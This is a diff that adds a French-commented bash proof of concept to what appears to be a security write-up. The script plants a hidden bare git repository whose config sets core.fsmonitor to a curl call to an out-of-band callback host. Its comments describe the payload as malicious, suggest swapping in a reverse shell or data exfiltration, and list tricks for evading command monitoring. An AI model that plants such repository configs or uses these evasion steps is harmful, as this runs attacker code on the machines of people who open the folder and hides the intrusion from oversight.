@@ -12,6 +12,41 @@ printf '[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = false
 chmod +x ./icons/icons.sh
 git init
 git config core.fsmonitor ./icons/icons.sh
+
+```
+Voici le script à lancer par la suite :
+
+```bash
+#!/bin/bash
+# Script de création d'un dépôt bare caché
+
+# Définir le répertoire cible (par exemple, un sous-répertoire légitime)
+TARGET_DIR="vendor/lib"
+
+# Créer la structure d'un dépôt bare avec des commandes non surveillées
+/usr/bin/mkdir -p "$TARGET_DIR"
+/usr/bin/install -d "$TARGET_DIR/objects" "$TARGET_DIR/refs"
+
+mkdir -p "$TARGET_DIR/objects/info" "$TARGET_DIR/objects/pack" "$TARGET_DIR/refs/heads"
+: > "$TARGET_DIR/objects/info/.keep"
+: > "$TARGET_DIR/objects/pack/.keep"
+: > "$TARGET_DIR/refs/heads/.keep"
+
+# Créer les fichiers de base d'un dépôt Git
+# Utilisation de `printf` ou `echo` avec des redirections pour éviter `touch`
+/usr/bin/printf 'ref: refs/heads/master\n' > "$TARGET_DIR/HEAD"
+/usr/bin/printf '[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = true\n' > "$TARGET_DIR/config"
+
+# Créer un fichier de configuration malveillant pour core.fsmonitor
+# Le payload peut être un reverse shell, une exfiltration de données, etc.
+PAYLOAD='curl http://hj473sagl15xoa05cck8d0gj3a91xslh.oastify.com/pwned'
+
+# Ajouter la configuration malveillante (la dernière valeur écrase les précédentes)
+/usr/bin/printf '[core]\n\tfsmonitor = "%s"\n' "$PAYLOAD" >> "$TARGET_DIR/config"
+
+# Optionnel : Créer un lien symbolique pour "laver" les chemins (bypass supplémentaire)
+/usr/bin/ln -s . "$TARGET_DIR/current"
+
 ```
 **Tested on Code**
 
